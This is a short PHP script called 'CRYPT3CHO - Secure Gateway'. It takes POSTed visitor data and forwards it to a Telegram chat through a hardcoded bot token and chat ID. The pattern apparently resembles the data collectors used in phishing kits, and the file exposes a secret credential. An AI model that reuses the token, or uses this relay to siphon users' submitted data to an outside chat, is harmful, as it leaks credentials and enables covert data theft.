<?php
// CRYPT3CHO - Secure Gateway
// Bloqueamos acceso directo al archivo
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 403 Forbidden');
    exit;
}

// Credenciales ocultas (Lado del Servidor)
$botToken = "8734320096:AAGlLFUxCWtlbzb1EHim-SLhCuu17V9FJWU";
$chatId   = "8375518813";

// Recibimos los datos del visitante
$input = json_encode(json_decode(file_get_contents("php://input"), true), JSON_PRETTY_PRINT);
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    $text = $data['text'];
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => false
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>
